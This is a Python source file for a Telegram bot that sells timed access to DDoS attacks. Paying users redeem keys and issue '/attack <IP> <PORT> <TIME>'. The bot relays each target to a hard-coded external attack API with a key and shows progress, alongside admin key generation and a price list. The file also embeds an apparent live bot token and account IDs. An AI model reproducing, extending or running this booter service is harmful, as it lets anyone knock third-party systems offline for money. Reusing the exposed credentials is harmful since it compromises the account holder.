import telebot
import requests
import time
import random
import string
import json
import os
import threading

# --- CONFIGURATION ---
TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
ADMIN_ID = 8787952549
CHANNEL_ID = "-1003605767830"
CHANNEL_LINK = "https://t.me/+jMe1PNQv_koxNzI1"
API_URL = "http://13.203.71.127/attack"
API_KEY_DDoS = "DESTRUCTED"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# Global State
active_attacks = []
MAX_CONCURRENT = 2

def load_db(file):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_db("users.json")
keys = load_db("keys.json")

# --- UTILS ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_progress_bar(remaining, total):
    filled = int(((total - remaining) / total) * 10)
    bar = "▓" * filled + "░" * (10 - filled)
    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"

def update_progress(chat_id, msg_id, target, port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        rem = int(duration - (time.time() - start_time))
        progress = get_progress_bar(rem, duration)
        try:
            bot.edit_message_text(
                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n🎯 **TARGET:** `{target}:{port}`\n⏳ **TIME:** `{rem}s`\n📊 **PROGRESS:** `{progress}`\n━━━━━━━━━━━━━━━━━━━━━━\n💥 **POWERED BY SASTA DEVELOPER**",
                chat_id, msg_id
            )
        except: break
        time.sleep(5)
    try:
        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
    except: pass
    global active_attacks
    active_attacks = [a for a in active_attacks if a['target'] != target]

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    
    if uid not in users:
        users[uid] = {"expiry": 0, "username": uname}
    else:
        users[uid]["username"] = uname
    save_db("users.json", users)

    remove_markup = telebot.types.ReplyKeyboardRemove()
    
    if is_joined(message.from_user.id):
        slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
        role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
        
        dashboard = (
            "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **USER:** `{message.from_user.first_name}`\n"
            f"💳 **PLAN:** `{role}`\n"
            f"🛰️ **SLOTS:** `{slots}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🛠️ **TERMINAL COMMANDS:**\n"
            "👉 /attack - Stress Target\n"
            "👉 /running - Live Attacks\n"
            "👉 /redeem - Activate Key\n"
            "👉 /myid - Your Info\n"
            "👉 /plans - Pricing\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 **OWNER:** @sastadeveloper"
        )
        bot.send_message(message.chat.id, dashboard, reply_markup=remove_markup)
    else:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK))
        bot.send_message(message.chat.id, "❌ **ACCESS DENIED**\nJoin channel to use terminal.", reply_markup=markup)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        bot.reply_to(message, "🚨 Join channel first!")
        return
    if users[uid]['expiry'] < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **VIP REQUIRED**")
        return
    if len(active_attacks) >= MAX_CONCURRENT:
        bot.reply_to(message, f"⚠️ **SLOTS FULL ({len(active_attacks)}/{MAX_CONCURRENT})**")
        return

    try:
        args = message.text.split()
        target, port, duration = args[1], args[2], int(args[3])
        if duration > 300: duration = 300
        active_attacks.append({"target": target, "end_time": time.time() + duration})
        threading.Thread(target=lambda: requests.get(API_URL, params={"ip":target,"port":port,"time":duration,"key":API_KEY_DDoS})).start()
        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
    except:
        bot.send_message(message.chat.id, "📝 `/attack <IP> <PORT> <TIME>`")

@bot.message_handler(commands=['running'])
def running(message):
    global active_attacks
    active_attacks = [a for a in active_attacks if a['end_time'] > time.time()]
    if not active_attacks:
        bot.reply_to(message, "✨ No active attacks.")
        return
    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}** 🔥\n\n"
    for a in active_attacks:
        rem = int(a['end_time'] - time.time())
        txt += f"🚀 `TARGET: {a['target']}` | `TIME: {rem}s`\n"
    bot.send_message(message.chat.id, txt)

# --- STEALTH ADMIN COMMANDS ---

@bot.message_handler(commands=['genkey'])
def admin_gen(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        days, count = int(args[1]), int(args[2])
        new_list = []
        for _ in range(count):
            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            keys[k] = {"duration": days * 86400, "used_by": None}
            new_list.append(k)
        save_db("keys.json", keys)
        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_list) + "`")
    except: bot.reply_to(message, "Usage: `/genkey <days> <count>`")

@bot.message_handler(commands=['keys'])
def show_keys(message):
    if message.from_user.id != ADMIN_ID: return
    if not keys: bot.reply_to(message, "No keys in database."); return
    txt = "🗝️ **MASTER KEY LIST**\n━━━━━━━━━━━━━━━\n"
    for k, v in keys.items():
        status = f"✅ Used by: {v['used_by']}" if v['used_by'] else "🆓 Unused"
        txt += f"🔑 `{k}` | {status}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['users'])
def show_users(message):
    if message.from_user.id != ADMIN_ID: return
    if not users: bot.reply_to(message, "No users found."); return
    txt = "👥 **USER DATABASE**\n━━━━━━━━━━━━━━━\n"
    for uid, data in users.items():
        uname = data.get("username", "Unknown")
        exp = data.get("expiry", 0)
        status = "💎 VIP" if exp > time.time() else "🆓 FREE"
        txt += f"🆔 `{uid}` | {uname} | {status}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['remove_key'])
def remove_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        k = message.text.split()[1]
        if k in keys:
            del keys[k]; save_db("keys.json", keys)
            bot.reply_to(message, f"✅ Key `{k}` deleted.")
        else: bot.reply_to(message, "❌ Not found.")
    except: bot.reply_to(message, "Usage: `/remove_key <KEY>`")

# --- FIXED REDEEM LOGIC ---
@bot.message_handler(commands=['redeem'])
def redeem(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    
    # Ensure user exists in db
    if uid not in users:
        users[uid] = {"expiry": 0, "username": uname}

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
            return
            
        k = parts[1]
        if k in keys and keys[k]['used_by'] is None:
            # Add time to current expiry
            current_time = time.time()
            if users[uid]['expiry'] < current_time:
                users[uid]['expiry'] = current_time + keys[k]['duration']
            else:
                users[uid]['expiry'] += keys[k]['duration']
                
            keys[k]['used_by'] = uname
            save_db("users.json", users)
            save_db("keys.json", keys)
            bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**\nYour plan has been activated/extended.")
        else:
            bot.reply_to(message, "❌ **Key Invalid or Already Used.**")
    except Exception as e:
        bot.reply_to(message, "⚠️ **System Error during redemption.**")

@bot.message_handler(commands=['myid', 'plans'])
def info_hub(message):
    uid = str(message.from_user.id)
    if 'myid' in message.text:
        exp = users.get(uid, {}).get("expiry", 0)
        rem = time.strftime('%Y-%m-%d %H:%M', time.localtime(exp)) if exp > time.time() else "EXPIRED"
        bot.reply_to(message, f"👤 **ID:** `{uid}`\n📅 **EXPIRY:** `{rem}`")
    else: bot.reply_to(message, "💎 **PLANS:** 1 Day: 100 | 7 Day: 400 | 30 Day: 2000")

print("SASTA DEVELOPER v9.1 REDEEM FIXED...")
bot.infinity_polling()
